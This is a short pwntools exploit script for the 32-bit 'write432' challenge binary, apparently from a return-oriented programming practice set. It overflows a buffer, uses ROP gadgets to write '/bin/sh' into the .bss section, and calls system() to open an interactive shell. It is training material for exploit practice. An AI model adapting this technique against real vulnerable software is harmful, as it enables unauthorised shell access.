#!/usr/bin/python

from pwn import *

s = process('./write432')
s.clean()

bss = 0x804a040
system = 0x08048430

# 0x08048670 : mov dword ptr [edi], ebp ; ret
mov_ptr_edi_ebp_ret = 0x08048670

# 0x080486da : pop edi ; pop ebp ; ret
pop_edi_pop_ebp_ret = 0x080486da

write_bin_sh_to_bss = p32(pop_edi_pop_ebp_ret)
write_bin_sh_to_bss += p32(bss)
write_bin_sh_to_bss += '/bin'
write_bin_sh_to_bss += p32(mov_ptr_edi_ebp_ret)

write_bin_sh_to_bss += p32(pop_edi_pop_ebp_ret)
write_bin_sh_to_bss += p32(bss + 4)
write_bin_sh_to_bss += '/sh\x00'
write_bin_sh_to_bss += p32(mov_ptr_edi_ebp_ret)


payload = 'A' * 44
payload += write_bin_sh_to_bss
payload += p32(system)
payload += p32(0xdeadbeef)
payload += p32(bss)

s.sendline(payload)

s.interactive()

